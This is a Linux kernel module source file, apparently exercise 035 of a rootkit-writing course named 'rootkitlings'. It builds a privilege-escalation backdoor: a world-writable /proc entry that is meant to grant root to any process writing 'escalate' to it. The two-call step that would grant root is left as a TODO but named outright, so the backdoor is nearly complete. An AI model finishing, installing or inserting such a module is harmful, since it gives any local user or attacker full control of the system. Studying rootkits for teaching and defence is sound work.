#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("035: privilege escalation via /proc trigger");

#define PROC_NAME "rootkitlings_privesc"
#define TRIGGER "escalate"

static struct proc_dir_entry *proc_entry;

static ssize_t privesc_write(struct file *file, const char __user *buf,
                              size_t count, loff_t *ppos)
{
    char kbuf[32];

    if (count >= sizeof(kbuf))
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    /* strip trailing newline */
    if (count > 0 && kbuf[count - 1] == '\n')
        kbuf[count - 1] = '\0';

    if (strcmp(kbuf, TRIGGER) != 0) {
        pr_info("rootkitlings/035: unknown command '%s'\n", kbuf);
        return count;
    }

    pr_info("rootkitlings/035: escalating pid %d (%s) to root\n",
            current->pid, current->comm);

    // TODO(rootkitlings): escalate le processus courant a root.
    //   1. Cree un nouveau jeu de credentials root: prepare_kernel_cred(NULL)
    //   2. Applique-le au processus courant: commit_creds(...)
    //
    //   ~3 lignes.

    pr_info("rootkitlings/035: pid %d is now root\n", current->pid);
    return count;
}

static const struct proc_ops privesc_ops = {
    .proc_write = privesc_write,
};

static int __init privesc_init(void)
{
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &privesc_ops);
    if (!proc_entry) {
        pr_err("rootkitlings/035: failed to create /proc/%s\n", PROC_NAME);
        return -ENOMEM;
    }

    pr_info("rootkitlings/035: write '%s' to /proc/%s to escalate\n",
            TRIGGER, PROC_NAME);
    return 0;
}

static void __exit privesc_exit(void)
{
    proc_remove(proc_entry);
    pr_info("rootkitlings/035: /proc/%s removed\n", PROC_NAME);
}

module_init(privesc_init);
module_exit(privesc_exit);
